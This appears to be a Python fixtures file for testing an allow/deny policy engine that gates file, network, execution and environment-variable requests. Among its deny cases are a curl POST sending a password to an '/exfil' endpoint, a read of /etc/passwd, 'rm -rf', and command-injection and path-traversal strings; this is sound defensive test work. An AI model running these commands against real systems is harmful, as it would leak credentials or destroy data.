"""
Sample test fixtures and test data payloads for policy testing.
"""

# Sample policy evaluation requests
SAMPLE_PAYLOADS = {
    "safe_file_read": {
        "action": "file_read",
        "command_name": "cat",
        "args": ["/workspace/README.md"],
        "metadata": {
            "target_path": "/workspace/README.md",
            "user_id": "user123",
            "request_id": "req-001",
        },
    },
    "unsafe_file_read": {
        "action": "file_read",
        "command_name": "cat",
        "args": ["/etc/passwd"],
        "metadata": {
            "target_path": "/etc/passwd",
            "user_id": "user123",
            "request_id": "req-002",
        },
    },
    "safe_write": {
        "action": "file_write",
        "command_name": "touch",
        "args": ["/workspace/test.txt"],
        "metadata": {
            "target_path": "/workspace/test.txt",
            "user_id": "user123",
            "request_id": "req-003",
        },
    },
    "destructive_without_approval": {
        "action": "file_write",
        "command_name": "rm",
        "args": ["/workspace/important.txt"],
        "metadata": {
            "target_path": "/workspace/important.txt",
            "user_id": "user123",
            "user_approval": False,
            "request_id": "req-004",
        },
    },
    "destructive_with_approval": {
        "action": "file_write",
        "command_name": "rm",
        "args": ["/workspace/temp.txt"],
        "metadata": {
            "target_path": "/workspace/temp.txt",
            "user_id": "user123",
            "user_approval": True,
            "action_reason": "Cleanup temporary files",
            "request_id": "req-005",
        },
    },
    "recursive_delete_without_hitl": {
        "action": "file_write",
        "command_name": "rm",
        "args": ["-rf", "/workspace/logs"],
        "metadata": {
            "target_path": "/workspace/logs",
            "user_id": "user123",
            "user_approval": True,
            "request_id": "req-015",
        },
    },
    "recursive_delete_with_hitl": {
        "action": "file_write",
        "command_name": "rm",
        "args": ["-rf", "/workspace/logs"],
        "metadata": {
            "target_path": "/workspace/logs",
            "user_id": "admin123",
            "user_approval": True,
            "hitl_authorized": True,
            "request_id": "req-016",
        },
    },
    "trusted_api_call": {
        "action": "network_request",
        "command_name": "curl",
        "args": ["https://api.github.com/user/repos"],
        "metadata": {
            "destination": "https://api.github.com/user/repos",
            "method": "GET",
            "port": 443,
            "user_id": "user123",
            "request_id": "req-006",
        },
    },
    "untrusted_domain": {
        "action": "network_request",
        "command_name": "curl",
        "args": ["https://malicious.com"],
        "metadata": {
            "destination": "https://malicious.com",
            "method": "GET",
            "port": 443,
            "user_id": "user123",
            "request_id": "req-007",
        },
    },
    "exfiltration_attempt": {
        "action": "network_request",
        "command_name": "curl",
        "args": ["--data", "password=secret123&user=admin"],
        "metadata": {
            "destination": "http://192.168.1.100/exfil",
            "method": "POST",
            "port": 80,
            "user_id": "user123",
            "request_id": "req-008",
        },
    },
    "safe_command_execute": {
        "action": "execute",
        "command_name": "echo",
        "args": ["hello", "world"],
        "metadata": {
            "user_id": "user123",
            "user_approval": False,
            "request_id": "req-008",
        },
    },
    "chmod_without_approval": {
        "action": "execute",
        "command_name": "chmod",
        "args": ["755", "/workspace/script.sh"],
        "metadata": {
            "user_id": "user123",
            "user_approval": False,
            "target_path": "/workspace/script.sh",
            "request_id": "req-009",
        },
    },
    "chmod_with_approval": {
        "action": "execute",
        "command_name": "chmod",
        "args": ["755", "/workspace/script.sh"],
        "metadata": {
            "user_id": "admin123",
            "user_approval": True,
            "user_role": "admin",
            "action_reason": "Make script executable",
            "target_path": "/workspace/script.sh",
            "request_id": "req-010",
        },
    },
    "high_memory_resource": {
        "action": "execute",
        "command_name": "python",
        "args": ["memory_intensive.py"],
        "metadata": {
            "user_id": "user123",
            "requested_memory": 3000,  # Exceeds 2048 limit
            "timeout_seconds": 300,
            "request_id": "req-011",
        },
    },
    "valid_resource_request": {
        "action": "execute",
        "command_name": "python",
        "args": ["script.py"],
        "metadata": {
            "user_id": "user123",
            "requested_memory": 1024,
            "requested_cpu": 50,
            "timeout_seconds": 300,
            "request_id": "req-012",
        },
    },
    "read_allowed_env_var": {
        "action": "read_env",
        "command_name": "read_env",
        "args": ["PATH"],
        "metadata": {
            "user_id": "user123",
            "request_id": "req-013",
        },
    },
    "read_sensitive_env_var": {
        "action": "read_env",
        "command_name": "read_env",
        "args": ["HOST_IP"],
        "metadata": {
            "user_id": "user123",
            "request_id": "req-014",
        },
    },
}

# Sample audit logs
SAMPLE_AUDIT_LOGS = [
    {
        "timestamp": "2024-01-15T10:30:45.123Z",
        "request_id": "req-001",
        "action": "file_read",
        "command": "cat",
        "target": "/workspace/README.md",
        "user_id": "user123",
        "decision": "ALLOW",
        "reason": "Path allowed: /workspace",
    },
    {
        "timestamp": "2024-01-15T10:31:12.456Z",
        "request_id": "req-002",
        "action": "file_read",
        "command": "cat",
        "target": "/etc/passwd",
        "user_id": "user123",
        "decision": "DENY",
        "reason": "Path not allowed: /etc/passwd",
    },
    {
        "timestamp": "2024-01-15T10:32:08.789Z",
        "request_id": "req-005",
        "action": "file_write",
        "command": "rm",
        "target": "/workspace/temp.txt",
        "user_id": "user123",
        "decision": "ALLOW",
        "reason": "Destructive command approved by user",
    },
    {
        "timestamp": "2024-01-15T10:33:22.012Z",
        "request_id": "req-006",
        "action": "network_request",
        "destination": "https://api.github.com",
        "method": "GET",
        "user_id": "user123",
        "decision": "ALLOW",
        "reason": "Domain in allowlist",
    },
    {
        "timestamp": "2024-01-15T10:34:15.345Z",
        "request_id": "req-010",
        "action": "execute",
        "command": "chmod",
        "target": "/workspace/script.sh",
        "user_id": "admin123",
        "user_role": "admin",
        "decision": "ALLOW",
        "reason": "Privileged command with admin approval",
    },
]

# Expected evaluation results
EXPECTED_RESULTS = {
    # File operations
    "safe_file_read": {"allow": True, "component": "file_operations"},
    "unsafe_file_read": {"allow": False, "component": "file_operations"},
    "safe_write": {"allow": True, "component": "file_operations"},
    "destructive_without_approval": {"allow": False, "component": "file_operations"},
    "destructive_with_approval": {"allow": True, "component": "file_operations"},
    # Network operations
    "trusted_api_call": {"allow": True, "component": "network_policies"},
    "untrusted_domain": {"allow": False, "component": "network_policies"},
    "exfiltration_attempt": {"allow": False, "component": "network_policies"},
    "recursive_delete_without_hitl": {"allow": False, "component": "admin_policies"},
    "recursive_delete_with_hitl": {"allow": True, "component": "admin_policies"},
    # Execution
    "safe_command_execute": {"allow": True, "component": "admin_policies"},
    "chmod_without_approval": {"allow": False, "component": "admin_policies"},
    "chmod_with_approval": {"allow": True, "component": "admin_policies"},
    # Resources
    "high_memory_resource": {"allow": False, "component": "resource_policies"},
    "valid_resource_request": {"allow": True, "component": "resource_policies"},
    # Environment variables
    "read_allowed_env_var": {"allow": True, "component": "policy"},
    "read_sensitive_env_var": {"allow": False, "component": "policy"},
}

# Policy test cases
POLICY_TEST_CASES = [
    {
        "name": "Allow reading from /workspace",
        "policy": "file_operations",
        "request": SAMPLE_PAYLOADS["safe_file_read"],
        "expected": True,
    },
    {
        "name": "Deny reading from /etc",
        "policy": "file_operations",
        "request": SAMPLE_PAYLOADS["unsafe_file_read"],
        "expected": False,
    },
    {
        "name": "Allow writing to /workspace",
        "policy": "file_operations",
        "request": SAMPLE_PAYLOADS["safe_write"],
        "expected": True,
    },
    {
        "name": "Deny destructive ops without approval",
        "policy": "admin_policies",
        "request": SAMPLE_PAYLOADS["destructive_without_approval"],
        "expected": False,
    },
    {
        "name": "Allow destructive ops with approval",
        "policy": "admin_policies",
        "request": SAMPLE_PAYLOADS["destructive_with_approval"],
        "expected": True,
    },
    {
        "name": "Allow trusted domain access",
        "policy": "network_policies",
        "request": SAMPLE_PAYLOADS["trusted_api_call"],
        "expected": True,
    },
    {
        "name": "Deny untrusted domain access",
        "policy": "network_policies",
        "request": SAMPLE_PAYLOADS["untrusted_domain"],
        "expected": False,
    },
    {
        "name": "Deny exfiltration of sensitive data to unauthorized IP",
        "policy": "network_policies",
        "request": SAMPLE_PAYLOADS["exfiltration_attempt"],
        "expected": False,
    },
    {
        "name": "Deny recursive delete without HITL authorization",
        "policy": "admin_policies",
        "request": SAMPLE_PAYLOADS["recursive_delete_without_hitl"],
        "expected": False,
    },
    {
        "name": "Allow recursive delete with HITL authorization",
        "policy": "admin_policies",
        "request": SAMPLE_PAYLOADS["recursive_delete_with_hitl"],
        "expected": True,
    },
    {
        "name": "Allow reading allowed environment variables",
        "policy": "policy",
        "request": SAMPLE_PAYLOADS["read_allowed_env_var"],
        "expected": True,
    },
    {
        "name": "Deny reading sensitive environment variables",
        "policy": "policy",
        "request": SAMPLE_PAYLOADS["read_sensitive_env_var"],
        "expected": False,
    },
]

# Sensitive data patterns for output filtering tests
SENSITIVE_DATA_PATTERNS = {
    "aws_key": "AKIAIOSFODNN7EXAMPLE",
    "password": "password: super_secret_123",
    "api_key": "api_key=sk_live_abc123def456",
    "ssn": "123-45-6789",
    "credit_card": "4111-1111-1111-1111",
    "private_key": "-----BEGIN PRIVATE KEY-----",
}

# Command validation test cases
INVALID_COMMANDS = [
    "rm; echo hack",  # Command injection
    "cat$(whoami)",  # Command substitution
    "ls|grep",  # Pipe injection
    "find&background",  # Background execution
    "echo`malicious`",  # Backtick injection
    "/workspace/../../../etc/passwd",  # Path traversal
    "/workspace/~root/file",  # Home directory traversal
]

VALID_ARGUMENTS = [
    "/workspace/file.txt",
    "-l",
    "--recursive",
    "127.0.0.1:8080",
    "file_123.txt",
    "/var/log/app.log",
]
